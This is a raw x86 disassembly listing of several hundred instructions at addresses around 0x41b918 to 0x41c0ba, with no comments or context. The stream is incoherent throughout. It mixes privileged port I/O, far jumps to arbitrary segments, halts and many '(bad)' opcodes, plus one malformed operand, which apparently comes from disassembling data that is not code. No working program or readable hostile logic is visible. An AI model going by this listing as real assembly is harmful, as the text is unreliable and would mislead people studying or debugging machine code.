  41b918:	enter  0xec0f,0x7d
  41b91c:	repnz inc ebx
  41b91e:	enter  0x5b1,0x97
  41b922:	inc    esp
  41b923:	pop    ss
  41b924:	adc    ebp,DWORD PTR [edx]
  41b926:	pop    ds
  41b927:	ss scas eax,DWORD PTR es:[edi]
  41b929:	ins    BYTE PTR es:[edi],dx
  41b92a:	bound  eax,QWORD PTR [ecx]
  41b92c:	sbb    al,0xce
  41b92e:	sub    ebx,DWORD PTR [ecx+0x69c4491d]
  41b934:	lods   eax,DWORD PTR ds:[esi]
  41b935:	std    
  41b936:	push   ebp
  41b937:	xor    bl,ch
  41b939:	inc    esi
  41b93a:	imul   eax,edi,0x54
  41b93d:	mov    ah,0xd2
  41b93f:	ror    BYTE PTR [esi+0x4c],1
  41b942:	or     al,0x17
  41b944:	out    dx,al
  41b945:	jne    0x41b8f5
  41b947:	hlt    
  41b948:	lods   al,BYTE PTR ds:[esi]
  41b949:	push   0x9a186310
  41b94e:	inc    edx
  41b94f:	pop    ss
  41b950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b951:	dec    esi
  41b952:	mov    esi,0xf5980c7e
  41b957:	xlat   BYTE PTR ds:[ebx]
  41b958:	ja     0x41b9c3
  41b95a:	xchg   ecx,eax
  41b95b:	ds retf 
  41b95d:	aad    0xe7
  41b95f:	jecxz  0x41b9ae
  41b961:	xchg   ecx,eax
  41b962:	test   eax,0xaa1a2a7e
  41b967:	retf   
  41b968:	dec    ecx
  41b969:	push   esi
  41b96a:	retf   
  41b96b:	pusha  
  41b96c:	jmp    0x93996e8f
  41b971:	or     esp,DWORD PTR [eax+0x58]
  41b974:	mov    ecx,0xdb3070ca
  41b979:	xor    ch,BYTE PTR [edx-0x656fdcfb]
  41b97f:	xchg   esp,eax
  41b980:	ret    0x2d7a
  41b983:	dec    edi
  41b984:	pop    esi
  41b985:	mov    DWORD PTR [edi+0x5a6b6fc8],esi
  41b98b:	dec    esp
  41b98c:	xor    esp,ebp
  41b98e:	mov    ds:0xb59194e4,al
  41b993:	cmp    al,BYTE PTR [edi-0x5f]
  41b996:	rcl    dh,cl
  41b998:	pop    eax
  41b999:	dec    esi
  41b99a:	push   ebx
  41b99b:	pop    ds
  41b99c:	shl    dl,0x22
  41b99f:	jmp    0xac31:0x6f91ebb9
  41b9a6:	xor    eax,0xef74d554
  41b9ab:	adc    ebx,DWORD PTR [eax+0x3c]
  41b9ae:	call   0x9334:0x64770d8b
  41b9b5:	outs   dx,DWORD PTR ds:[esi]
  41b9b6:	adc    eax,0xb2c4342a
  41b9bb:	pop    eax
  41b9bc:	push   ds
  41b9bd:	xchg   DWORD PTR [edx],eax
  41b9bf:	pop    eax
  41b9c0:	jns    0x41b981
  41b9c2:	xor    bl,BYTE PTR ds:[ecx-0x4]
  41b9c6:	shr    DWORD PTR [ebx+0x11ca5421],1
  41b9cc:	dec    eax
  41b9cd:	inc    esi
  41b9ce:	xchg   edi,eax
  41b9cf:	mov    cl,0x79
  41b9d1:	or     edi,ebp
  41b9d3:	mov    BYTE PTR [eax+0x26914510],dh
  41b9d9:	idiv   BYTE PTR ds:0x5f48d8bb
  41b9df:	push   0x1b79ed27
  41b9e4:	adc    BYTE PTR [edi],ah
  41b9e6:	mov    ch,BYTE PTR [edx-0x6b395753]
  41b9ec:	in     al,0xa1
  41b9ee:	and    edi,ecx
  41b9f0:	inc    edx
  41b9f1:	add    eax,0x32f0aa63
  41b9f6:	jne    0x41b9c2
  41b9f8:	js     0x41ba19
  41b9fa:	pop    ecx
  41b9fb:	popa   
  41b9fc:	jae    0x41b988
  41b9fe:	push   edi
  41b9ff:	mov    DWORD PTR [edx+esi*1+0x3e],ebx
  41ba03:	mov    ah,0xb4
  41ba05:	sar    edi,0x26
  41ba08:	(bad)  
  41ba09:	out    0xdf,al
  41ba0b:	nop
  41ba0c:	out    dx,eax
  41ba0d:	add    eax,0x6f5eecfe
  41ba12:	inc    ecx
  41ba13:	or     al,0xa7
  41ba15:	mov    bh,0x1b
  41ba17:	cdq    
  41ba18:	pop    ebx
  41ba19:	outs   dx,DWORD PTR ds:[esi]
  41ba1a:	loopne 0x41ba61
  41ba1c:	je     0x41ba35
  41ba1e:	adc    al,0x63
  41ba20:	dec    DWORD PTR [edx]
  41ba22:	fs xor al,0x1
  41ba25:	icebp  
  41ba26:	pop    edx
  41ba27:	daa    
  41ba28:	sbb    al,BYTE PTR [edx]
  41ba2a:	dec    eax
  41ba2b:	fistp  WORD PTR [eax-0x5]
  41ba2e:	pushf  
  41ba2f:	mov    ebx,0x27fb7711
  41ba34:	dec    edx
  41ba35:	and    BYTE PTR es:[eax+0x3b],dh
  41ba39:	jge    0x41b9c2
  41ba3b:	mov    cl,0x34
  41ba3d:	xor    al,0x89
  41ba3f:	mov    al,0x5c
  41ba41:	ss and eax,0x24f1f5fc
  41ba47:	mov    BYTE PTR [eax],cl
  41ba49:	fs test eax,0x65041489
  41ba4f:	mov    ah,0x90
  41ba51:	fcomp  QWORD PTR [ecx]
  41ba53:	add    BYTE PTR [edx],0xf7
  41ba56:	jmp    0xdbda:0x6840baa1
  41ba5d:	neg    DWORD PTR [esi+0x66]
  41ba60:	mov    edi,0x65f649ee
  41ba65:	jae    0x41ba48
  41ba67:	dec    esi
  41ba68:	cwde   
  41ba69:	mov    ebx,0xd2ecf812
  41ba6e:	sbb    BYTE PTR [ecx+ecx*2-0x68e9702d],dl
  41ba75:	fldcw  WORD PTR [edi-0x9d754ee]
  41ba7b:	push   ebx
  41ba7c:	pushf  
  41ba7d:	pop    ss
  41ba7e:	push   0x7dab47cf
  41ba83:	in     al,dx
  41ba84:	jae    0x41baed
  41ba86:	sub    eax,0x20293acf
  41ba8b:	clc    
  41ba8c:	int    0x3
  41ba8e:	mov    ?,WORD PTR [ebx+0x28]
  41ba91:	imul   ecx,ebp,0x12
  41ba94:	nop
  41ba95:	xor    DWORD PTR [ebx+ecx*4-0x2dbd0612],eax
  41ba9c:	stos   BYTE PTR es:[edi],al
  41ba9d:	jmp    0xd416c485
  41baa2:	mov    edi,0xa77bcadc
  41baa7:	std    
  41baa8:	lds    eax,FWORD PTR [ebx+eiz*4]
  41baab:	jns    0x41ba31
  41baad:	fistp  QWORD PTR [esi+0x5]
  41bab0:	or     BYTE PTR [edx+0x50],cl
  41bab3:	xor    al,0x4e
  41bab5:	pop    ss
  41bab6:	or     eax,0x6ed5af00
  41babb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41babc:	les    esp,FWORD PTR [ebx+0x5]
  41babf:	pop    ss
  41bac0:	pop    DWORD PTR [edx+eiz*1+0x46]
  41bac4:	dec    edx
  41bac5:	outs   dx,BYTE PTR ds:[esi]
  41bac6:	fsubr  QWORD PTR [eax]
  41bac8:	mov    esp,0xaeac71ce
  41bacd:	test   al,0x59
  41bacf:	add    ebp,eax
  41bad1:	push   edx
  41bad2:	cwde   
  41bad3:	scas   al,BYTE PTR es:[edi]
  41bad4:	(bad)  [ebx-0x9f61083]
  41bada:	rcl    ah,cl
  41badc:	jb     0x41bb0c
  41bade:	xchg   ecx,eax
  41badf:	retf   0x88ce
  41bae2:	imul   ebp,ebp,0x8e578cb7
  41bae8:	test   BYTE PTR [esi-0x1e38a7ba],dh
  41baee:	pop    edx
  41baef:	test   eax,0x38c06a09
  41baf4:	adc    DWORD PTR [edi+0x4bae1c2],edx
  41bafa:	scas   al,BYTE PTR es:[edi]
  41bafb:	add    edx,DWORD PTR [ebp+0x3af93ebc]
  41bb01:	jmp    0x4b5eb584
  41bb06:	ror    BYTE PTR [ecx-0x59],1
  41bb09:	dec    esi
  41bb0a:	repnz hlt 
  41bb0c:	push   0xffffffd9
  41bb0e:	cli    
  41bb0f:	(bad)  
  41bb10:	inc    eax
  41bb11:	int    0x4e
  41bb13:	aam    0x3a
  41bb15:	dec    eax
  41bb16:	pop    esi
  41bb17:	pop    ds
  41bb18:	xlat   BYTE PTR ds:[ebx]
  41bb19:	pop    esi
  41bb1a:	scas   eax,DWORD PTR es:[edi]
  41bb1b:	loop   0x41bb7e
  41bb1d:	je     0x41baca
  41bb1f:	cli    
  41bb20:	add    eax,0xdca8226b
  41bb25:	mov    ds:0xb294adc0,eax
  41bb2a:	gs lock ret 0xf69b
  41bb2f:	into   
  41bb30:	jns    0x41babc
  41bb32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb33:	dec    eax
  41bb34:	jbe    0x41bb57
  41bb36:	dec    eax
  41bb37:	mov    al,ds:0x79eb739b
  41bb3c:	cdq    
  41bb3d:	or     cl,BYTE PTR [ebp+0x1471b95c]
  41bb43:	fidivr WORD PTR [edi+esi*8-0x17885733]
  41bb4a:	mov    al,0x61
  41bb4c:	xlat   BYTE PTR ds:[ebx]
  41bb4d:	cld    
  41bb4e:	cmp    DWORD PTR [edx],eax
  41bb50:	into   
  41bb51:	push   0x3294a5fc
  41bb56:	js     0x41bb45
  41bb58:	fld    QWORD PTR [esi-0x48942c60]
  41bb5e:	push   edi
  41bb5f:	pop    edi
  41bb60:	xor    eax,DWORD PTR [ebx]
  41bb62:	xchg   esp,eax
  41bb63:	hlt    
  41bb64:	xchg   edi,eax
  41bb65:	fisubr WORD PTR [edi-0x79]
  41bb68:	adc    eax,0x7bd21c70
  41bb6d:	in     eax,dx
  41bb6e:	and    DWORD PTR [edx+0x6953191d],esi
  41bb74:	pop    eax
  41bb75:	imul   edx,DWORD PTR [ebp+eiz*1+0x24],0x4a
  41bb7a:	dec    edx
  41bb7b:	pop    eax
  41bb7c:	pop    esi
  41bb7d:	xor    eax,0x9fd4d273
  41bb82:	neg    edi
  41bb84:	pop    edx
  41bb85:	mov    gs,WORD PTR [edx-0x5792ff92]
  41bb8b:	arpl   WORD PTR [ebp-0x4c],sp
  41bb8e:	imul   ecx,DWORD PTR [ebp-0x4e],0x4d
  41bb92:	fcmovnu st,st(0)
  41bb94:	lds    eax,FWORD PTR [ecx+ecx*4-0x70]
  41bb98:	lods   al,BYTE PTR ds:[esi]
  41bb99:	ficomp WORD PTR [edx+0x6c]
  41bb9c:	dec    ebp
  41bb9d:	std    
  41bb9e:	jnp    0x41bb2f
  41bba0:	ds mov bh,0xbc
  41bba3:	mov    al,ds:0x42046f83
  41bba8:	jae    0x41bbf0
  41bbaa:	push   edi
  41bbab:	pop    esp
  41bbac:	mov    al,0x91
  41bbae:	push   cs
  41bbaf:	and    bh,0xed
  41bbb2:	in     eax,dx
  41bbb3:	xchg   ebp,eax
  41bbb4:	sub    ebp,ebx
  41bbb6:	retf   0xf036
  41bbb9:	sbb    ebx,DWORD PTR [ecx-0x1ceb93f2]
  41bbbf:	push   0xe3e8b241
  41bbc4:	jno    0x41bb83
  41bbc6:	jns    0x41bba3
  41bbc8:	rol    ecx,0x85
  41bbcb:	scas   eax,DWORD PTR es:[edi]
  41bbcc:	icebp  
  41bbcd:	sti    
  41bbce:	enter  0x8717,0xfd
  41bbd2:	imul   eax,eax,0xa988467f
  41bbd8:	fmul   st(4),st
  41bbda:	sahf   
  41bbdb:	es or  ah,dh
  41bbde:	mov    esp,0xd13b3bb0
  41bbe3:	mov    ecx,0x7923a775
  41bbe8:	mov    esi,0x66c6e6e2
  41bbed:	sbb    BYTE PTR [ecx+0x59df1899],bh
  41bbf3:	cld    
  41bbf4:	xchg   edi,eax
  41bbf5:	adc    al,BYTE PTR [esi]
  41bbf7:	sbb    al,0xb3
  41bbf9:	or     dh,ch
  41bbfb:	pushf  
  41bbfc:	arpl   WORD PTR [edi+0x6e17e34],di
  41bc02:	std    
  41bc03:	sti    
  41bc04:	call   0x96b2:0x6d4b1073
  41bc0b:	sbb    eax,0x78727e76
  41bc10:	cwde   
  41bc11:	mov    ds:0x785ea546,al
  41bc16:	mov    eax,ds:0x9617afb
  41bc1b:	iret   
  41bc1c:	aas    
  41bc1d:	mov    BYTE PTR [ebp+0x1f868db9],0x66
  41bc24:	fistp  DWORD PTR [ecx]
  41bc26:	mov    ds:0x2f2a48a0,al
  41bc2b:	sti    
  41bc2c:	push   di
  41bc2e:	fild   DWORD PTR [esi-0xd]
  41bc31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc32:	and    DWORD PTR [ebx],0x76640e7e
  41bc38:	or     ebp,eax
  41bc3a:	push   es
  41bc3b:	fs dec esp
  41bc3d:	dec    eax
  41bc3e:	leave  
  41bc3f:	cmp    esi,DWORD PTR [ebx]
  41bc41:	sub    BYTE PTR [esi+0x360eeed8],ah
  41bc47:	repz popa 
  41bc49:	mov    edx,0x8890f9c8
  41bc4e:	inc    esp
  41bc4f:	jae    0x41bc76
  41bc51:	adc    eax,0x335c48eb
  41bc56:	xor    ebx,DWORD PTR ds:0xdb536905
  41bc5c:	or     eax,0x26cfb018
  41bc61:	cmp    BYTE PTR [edx],ah
  41bc63:	push   ds
  41bc64:	sub    ecx,DWORD PTR [edi-0x6f]
  41bc67:	xlat   BYTE PTR ds:[ebx]
  41bc68:	jno    0x41bc7f
  41bc6a:	push   0x531e64d4
  41bc6f:	mov    bl,al
  41bc71:	mov    edi,0xe4be7904
  41bc76:	stos   BYTE PTR es:[edi],al
  41bc77:	call   0x4972:0xcbde734c
  41bc7e:	cmp    dh,BYTE PTR [edx+0x7]
  41bc81:	test   eax,0x73052123
  41bc86:	sbb    al,0x74
  41bc88:	in     al,dx
  41bc89:	sti    
  41bc8a:	mov    WORD PTR [edx-0x38c8e1f],es
  41bc90:	xor    eax,0xdc725b78
  41bc95:	cmp    BYTE PTR [esi-0x52],dl
  41bc98:	inc    eax
  41bc99:	stc    
  41bc9a:	sub    dl,bl
  41bc9c:	pop    esi
  41bc9d:	mov    eax,ds:0x118e08e6
  41bca2:	ret    
  41bca3:	xchg   edx,eax
  41bca4:	pop    esp
  41bca5:	mov    al,0x20
  41bca7:	in     eax,dx
  41bca8:	inc    esi
  41bca9:	aam    0xab
  41bcab:	rcr    BYTE PTR [edx-0x41],0xa7
  41bcaf:	inc    edx
  41bcb0:	dec    eax
  41bcb1:	dec    edi
  41bcb3:	mov    ecx,0x66fb2616
  41bcb8:	xor    esi,esi
  41bcba:	adc    ebx,edi
  41bcbc:	add    BYTE PTR [edi+0x637a0f96],bh
  41bcc2:	shl    DWORD PTR [ebp-0x6e31b900],1
  41bcc8:	mov    al,ds:0xde1e67e8
  41bccd:	out    0x6c,eax
  41bccf:	clc    
  41bcd0:	xchg   BYTE PTR [edx+0x79],dh
  41bcd3:	dec    ecx
  41bcd4:	or     ebp,edi
  41bcd6:	xor    al,0xe2
  41bcd8:	or     eax,0x67692751
  41bcdd:	cmp    BYTE PTR [eax+0x5459b17b],dl
  41bce3:	repnz inc ecx
  41bce5:	sub    BYTE PTR [ebx+edx*8-0xf5c8fd4],bh
  41bcec:	enter  0xc929,0x36
  41bcf0:	adc    esi,ebx
  41bcf2:	dec    esi
  41bcf3:	push   0x88354611
  41bcf8:	hlt    
  41bcf9:	lods   al,BYTE PTR ds:[esi]
  41bcfa:	and    ecx,DWORD PTR [edi+0x58]
  41bcfd:	add    DWORD PTR [ecx],0xffffffa3
  41bd00:	dec    ebx
  41bd01:	jecxz  0x41bc94
  41bd03:	sub    dh,BYTE PTR [edx-0x7f]
  41bd06:	adc    al,0x67
  41bd08:	adc    cl,BYTE PTR ds:0x24b8d3f4
  41bd0e:	inc    ebp
  41bd0f:	and    eax,0xa00c4e83
  41bd14:	mov    edx,0xf12f849
  41bd19:	cli    
  41bd1a:	cli    
  41bd1b:	xor    eax,0xc705ea17
  41bd20:	mov    eax,0x26e72da4
  41bd25:	addr16 xchg esi,eax
  41bd27:	es push esi
  41bd29:	mov    esi,0x8e263f4
  41bd2e:	push   0xffffffd8
  41bd30:	lea    ebp,[edi-0x26]
  41bd33:	je     0x41bd28
  41bd35:	inc    edi
  41bd36:	or     bh,bl
  41bd38:	ss scas al,BYTE PTR es:[edi]
  41bd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd3c:	mov    al,0x77
  41bd3e:	clc    
  41bd3f:	mov    bh,0xfd
  41bd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd42:	pushf  
  41bd43:	push   DWORD PTR [edx]
  41bd45:	adc    eax,0xf98082b2
  41bd4a:	push   cs
  41bd4b:	cdq    
  41bd4c:	jo     0x41bd73
  41bd4e:	sub    eax,0xd8cfeca8
  41bd53:	clc    
  41bd54:	cmp    DWORD PTR [ebx],0xe6e5acbb
  41bd5a:	jne    0x41bd52
  41bd5c:	or     bl,BYTE PTR [ebp+0x4d89b4e2]
  41bd62:	pop    esp
  41bd63:	(bad)  
  41bd64:	div    BYTE PTR [ebx-0x4e]
  41bd67:	outs   dx,BYTE PTR ds:[esi]
  41bd68:	rcl    DWORD PTR [ebx-0x365f7b40],cl
  41bd6e:	and    eax,0xdaa5970a
  41bd73:	dec    esp
  41bd74:	pop    ds
  41bd75:	push   edi
  41bd76:	jae    0x41bdcc
  41bd78:	clc    
  41bd79:	push   ss
  41bd7a:	sub    DWORD PTR [edi+edx*8-0x64],esp
  41bd7e:	stc    
  41bd7f:	pop    ebp
  41bd80:	adc    dl,bh
  41bd82:	(bad)  
  41bd83:	(bad)
  41bd86:	(bad)  
  41bd87:	sbb    ecx,DWORD PTR ds:0xdfec44f1
  41bd8d:	int3   
  41bd8e:	in     eax,0xf4
  41bd90:	cwde   
  41bd91:	pop    esp
  41bd92:	or     eax,edi
  41bd94:	xchg   edx,eax
  41bd95:	mov    esi,0xf77d3b2a
  41bd9a:	xchg   cx,di
  41bd9d:	xchg   BYTE PTR [ecx+0x57fb99eb],bh
  41bda3:	add    cl,0x2f
  41bda6:	adc    DWORD PTR [ebx+0x52912fa5],edx
  41bdac:	mov    edx,0xedfc7261
  41bdb1:	mov    ebp,0xd84e5357
  41bdb6:	sub    eax,0x273b9141
  41bdbb:	jmp    esi
  41bdbd:	test   BYTE PTR [ebx],dh
  41bdbf:	fwait
  41bdc0:	(bad)  
  41bdc1:	or     BYTE PTR [ebx+0x7c],cl
  41bdc4:	push   0xffffff8b
  41bdc6:	push   ds
  41bdc7:	mov    eax,ecx
  41bdc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdca:	sbb    eax,0x5f4b3998
  41bdcf:	js     0x3b2bb88c
  41bdd5:	fwait
  41bdd6:	xchg   ebp,eax
  41bdd7:	adc    al,0xf4
  41bdd9:	cmp    eax,0xd47c3c2f
  41bdde:	jnp    0x41bdf9
  41bde0:	add    edi,eax
  41bde2:	xchg   DWORD PTR [edx],ebp
  41bde4:	push   edi
  41bde5:	lahf   
  41bde6:	cmp    ebx,DWORD PTR [ebx+0x118c41fa]
  41bdec:	cmp    BYTE PTR [esi+edi*4-0x64],bh
  41bdf0:	stos   DWORD PTR es:[edi],eax
  41bdf1:	add    al,0x51
  41bdf3:	adc    dl,ah
  41bdf5:	add    edx,DWORD PTR [edx+0x2207bef1]
  41bdfb:	xor    bl,BYTE PTR [ebx+0x6fbaeb98]
  41be01:	std    
  41be02:	dec    esi
  41be04:	fs lahf 
  41be06:	sub    al,0x1d
  41be08:	hlt    
  41be09:	and    bh,BYTE PTR [eax-0x79ab5896]
  41be0f:	mov    eax,ds:0x36bddf78
  41be14:	cmp    eax,0x2c42a30e
  41be19:	jns    0x41be16
  41be1b:	out    dx,al
  41be1c:	jmp    DWORD PTR [edi]
  41be1e:	push   0x740446a9
  41be23:	fwait
  41be24:	sbb    ah,BYTE PTR [edx-0x39]
  41be27:	and    DWORD PTR [edi],0xfffffff7
  41be2a:	xchg   ebx,eax
  41be2b:	lock mov cl,0xfa
  41be2e:	push   ebp
  41be2f:	xor    ch,dl
  41be31:	dec    ebx
  41be32:	xor    bl,BYTE PTR [esp+eiz*4+0x7e]
  41be36:	call   0xef3:0x4266745b
  41be3d:	and    eax,0x3ecba333
  41be42:	shr    DWORD PTR [esi+ebx*8],1
  41be45:	fidivr DWORD PTR [esi-0x6e1d46d6]
  41be4b:	push   es
  41be4c:	jno    0x41bdeb
  41be4e:	jbe    0x41be9e
  41be50:	enter  0x36ec,0x23
  41be54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be55:	jmp    0xa0bb8606
  41be5a:	jno    0x41be74
  41be5c:	imul   ebp,DWORD PTR [ebp-0x4b80687a],0x8c5e2442
  41be66:	adc    ebp,DWORD PTR [esi-0x77]
  41be69:	pop    ss
  41be6a:	inc    edi
  41be6b:	(bad)  
  41be6c:	sbb    eax,0xb2ff213e
  41be71:	sub    ch,BYTE PTR [ebx+0x38]
  41be74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be75:	repz adc eax,0x1efd9fe9
  41be7b:	sub    al,0xdd
  41be7d:	inc    ebx
  41be7e:	and    al,0xd4
  41be80:	mov    al,ds:0x7999c97c
  41be85:	pushw  0x9
  41be88:	call   0x8c1b:0x6da05e6f
  41be8f:	cmp    ch,BYTE PTR [esi+0x4d3bf7f2]
  41be95:	xor    eax,0xb02757e6
  41be9a:	jmp    0x2af3119a
  41be9f:	mov    esi,0xbc972f9d
  41bea4:	push   ecx
  41bea5:	mov    cl,0xd1
  41bea7:	sub    al,0xda
  41bea9:	mov    DWORD PTR ds:0xec7ab92a,edx
  41beaf:	xor    dh,BYTE PTR [ebp+0x12]
  41beb2:	or     BYTE PTR [ecx+0x1105d3b3],0x9a
  41beb9:	mov    esp,0x5456d7c1
  41bebe:	out    0x6c,eax
  41bec0:	dec    eax
  41bec1:	jmp    0x41be60
  41bec3:	(bad)  
  41bec4:	je     0x41be49
  41bec6:	ficom  WORD PTR [ebp-0x563eb4b1]
  41becc:	inc    edx
  41becd:	outs   dx,DWORD PTR ds:[esi]
  41bece:	cmp    al,0x82
  41bed0:	sahf   
  41bed1:	xor    eax,0x9955de4d
  41bed6:	lock mov edx,DWORD PTR [edx]
  41bed9:	imul   esi,DWORD PTR [edx-0x25],0x24
  41bedd:	jne    0x41bf38
  41bedf:	mov    esi,0x91b5e804
  41bee4:	test   BYTE PTR [ebx],cl
  41bee6:	add    BYTE PTR [edi],al
  41bee8:	push   edx
  41bee9:	(bad)  
  41beea:	mov    al,0x80
  41beec:	jns    0x41bf29
  41beee:	pop    edx
  41beef:	and    al,BYTE PTR [ebx+0x43fcdd46]
  41bef5:	xchg   edx,eax
  41bef6:	(bad)  
  41bef7:	into   
  41bef8:	shr    BYTE PTR [ebx+0x66],cl
  41befb:	ss inc esp
  41befd:	rcr    DWORD PTR [esi+0x46c96f08],1
  41bf03:	dec    ebx
  41bf04:	cmp    al,0xeb
  41bf06:	sub    al,0xcd
  41bf08:	xor    BYTE PTR [edx],bh
  41bf0a:	mov    DWORD PTR [ecx+eiz*2-0x5e],ecx
  41bf0e:	adc    dl,BYTE PTR [eax+0x59]
  41bf11:	call   0xb98e:0xaf977f6
  41bf18:	pop    ds
  41bf19:	push   esi
  41bf1a:	and    al,0xa9
  41bf1c:	push   0x3b2332ae
  41bf21:	cld    
  41bf22:	inc    ebx
  41bf23:	imul   edi,DWORD PTR [ecx-0x41],0xd79a7d09
  41bf2a:	cwde   
  41bf2b:	push   ss
  41bf2c:	fxam   
  41bf2e:	add    al,BYTE PTR [edi-0xfb75325]
  41bf34:	inc    edi
  41bf35:	dec    edi
  41bf36:	int    0xfa
  41bf38:	pushf  
  41bf39:	sar    DWORD PTR [esi],0x9b
  41bf3c:	pushf  
  41bf3d:	mov    fs,WORD PTR [eax-0x8]
  41bf40:	xlat   BYTE PTR ds:[ebx]
  41bf41:	loopne 0x41bf9c
  41bf43:	jg     0x41bf71
  41bf45:	arpl   WORD PTR [eax-0x52],sp
  41bf48:	cmp    eax,DWORD PTR [ebx+0xceb6fdb]
  41bf4e:	dec    edx
  41bf4f:	aaa    
  41bf50:	mov    ah,BYTE PTR [ecx+0x2e]
  41bf53:	jne    0x41bf08
  41bf55:	jne    0x41bedc
  41bf57:	mov    eax,ds:0xac62802b
  41bf5c:	mov    edx,0xf9797153
  41bf61:	pop    edi
  41bf62:	leave  
  41bf63:	loope  0x41bf18
  41bf65:	outs   dx,BYTE PTR ds:[esi]
  41bf66:	add    ecx,DWORD PTR [ecx+0x67]
  41bf69:	scas   eax,DWORD PTR es:[edi]
  41bf6a:	mov    edx,0x7b41f13b
  41bf6f:	jge    0x41bf3c
  41bf71:	xchg   ebx,eax
  41bf72:	cli    
  41bf73:	loope  0x41bf48
  41bf75:	fisubr DWORD PTR [edi+0x6245d1b8]
  41bf7b:	xor    eax,0x688275ec
  41bf80:	adc    BYTE PTR [edx+0x30],bl
  41bf83:	cmp    eax,eax
  41bf85:	cli    
  41bf86:	in     al,dx
  41bf87:	push   esi
  41bf88:	repnz gs dec ebx
  41bf8b:	push   0x1239c6e1
  41bf90:	daa    
  41bf91:	outs   dx,BYTE PTR ds:[esi]
  41bf92:	pop    es
  41bf93:	add    ebp,ebp
  41bf95:	cmp    eax,0x2d6c4ed
  41bf9a:	mov    ecx,0xf7ee19b
  41bf9f:	jmp    0x408b0b75
  41bfa4:	adc    eax,0xcde96025
  41bfa9:	cmp    DWORD PTR [ecx+ebx*1+0x15c0611e],eax
  41bfb0:	pop    ecx
  41bfb1:	ret    0x6d8d
  41bfb4:	sub    esp,edi
  41bfb6:	jae    0x41bfd7
  41bfb8:	mov    ch,0x40
  41bfba:	inc    eax
  41bfbb:	push   ecx
  41bfbc:	scas   al,BYTE PTR es:[edi]
  41bfbd:	ins    DWORD PTR es:[edi],dx
  41bfbe:	push   0x4c771ca0
  41bfc3:	jge    0x41bfa0
  41bfc5:	shl    bl,1
  41bfc7:	adc    ecx,DWORD PTR [ebx+edx*1+0x6bf7b301]
  41bfce:	or     al,0x86
  41bfd0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bfd2:	jmp    FWORD PTR [edi]
  41bfd4:	ja     0x41c04a
  41bfd6:	add    DWORD PTR [edi],ebp
  41bfd8:	cmp    ah,BYTE PTR [edx]
  41bfda:	pop    esi
  41bfdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bfdc:	mov    ebx,0x4c47d794
  41bfe1:	mov    cl,0xf3
  41bfe3:	mov    ebp,0x97acadf8
  41bfe8:	std    
  41bfe9:	fstp   DWORD PTR cs:[eax+0x48a0324b]
  41bff0:	stos   BYTE PTR es:[edi],al
  41bff1:	in     eax,dx
  41bff2:	adc    al,0x30
  41bff4:	fcom   QWORD PTR [ebp+0x40a70616]
  41bffa:	out    dx,al
  41bffb:	and    eax,DWORD PTR [ecx+edi*2]
  41bffe:	sahf   
  41bfff:	jbe    0x41c020
  41c001:	aad    0x39
  41c003:	stc    
  41c004:	mov    eax,0x2b621e6b
  41c009:	sbb    al,0x70
  41c00b:	mov    ebp,0xe3b63289
  41c010:	stos   DWORD PTR es:[edi],eax
  41c011:	mov    es,ecx
  41c013:	shl    DWORD PTR [ebx],1
  41c015:	mov    BYTE PTR [esp+eiz*4],ch
  41c018:	(bad)  
  41c019:	xchg   esi,eax
  41c01a:	sub    BYTE PTR [eax+0x730f0a1a],dh
  41c020:	in     al,0x5e
  41c022:	or     ebx,DWORD PTR [edx]
  41c024:	mov    ebp,ss
  41c026:	jo     0x41c052
  41c028:	push   ss
  41c029:	xor    al,BYTE PTR [ebx]
  41c02b:	mov    ch,0x7c
  41c02d:	dec    ebp
  41c02e:	or     eax,0x33cbfddd
  41c033:	(bad)  
  41c034:	stos   DWORD PTR es:[edi],eax
  41c035:	scas   eax,DWORD PTR es:[edi]
  41c036:	mov    BYTE PTR [ebp+eiz*2+0x71],cl
  41c03a:	inc    ebp
  41c03b:	cmc    
  41c03c:	dec    edi
  41c03d:	iret   
  41c03e:	mov    ah,0xe7
  41c040:	stos   BYTE PTR es:[edi],al
  41c041:	or     BYTE PTR [ebx+0x5b7a1f86],dl
  41c047:	retf   
  41c048:	fldcw  WORD PTR [ecx]
  41c04a:	xor    BYTE PTR [ebx],cl
  41c04c:	jbe    0x41bfd0
  41c04e:	push   esp
  41c04f:	mov    ebp,0xdc329140
  41c054:	enter  0xd8ed,0xb6
  41c058:	loopne 0x41c044
  41c05a:	sub    cl,BYTE PTR [esi+0x52e1e075]
  41c060:	pop    eax
  41c061:	adc    BYTE PTR [edi+0x59],dh
  41c064:	nop
  41c065:	push   0x5b
  41c067:	pop    edi
  41c068:	scas   al,BYTE PTR es:[edi]
  41c069:	retf   
  41c06a:	jnp    0x41c016
  41c06c:	popf   
  41c06d:	std    
  41c06e:	sub    ecx,DWORD PTR [ebp+ecx*1-0x54]
  41c072:	xor    BYTE PTR [esi-0x90999a4],ch
  41c078:	jo     0x41c044
  41c07a:	mov    ch,0x42
  41c07c:	popa   
  41c07d:	push   edx
  41c07e:	retf   0x9c22
  41c081:	adc    DWORD PTR [ebp+0x360a61c1],0x67
  41c088:	sahf   
  41c089:	(bad)  
  41c08a:	adc    eax,0x921572e5
  41c08f:	iret   
  41c090:	rol    eax,0x63
  41c093:	out    0xa8,eax
  41c095:	lods   al,BYTE PTR ds:[esi]
  41c096:	les    esp,FWORD PTR [edx-0x15214d08]
  41c09c:	data16 cmp ch,BYTE PTR [eax+0x4dbd510b]
  41c0a3:	mov    ch,0x25
  41c0a5:	push   ecx
  41c0a6:	fs icebp 
  41c0a8:	aad    0xf8
  41c0aa:	push   ss
  41c0ab:	and    esp,ebp
  41c0ad:	outs   dx,DWORD PTR ds:[esi]
  41c0ae:	cmc    
  41c0af:	fmul   QWORD PTR [edx-0x202b5494]
  41c0b5:	inc    ecx
  41c0b6:	and    bl,BYTE PTR [eax]
  41c0b8:	pop    eax
  41c0b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ba:	sub    al,0x0
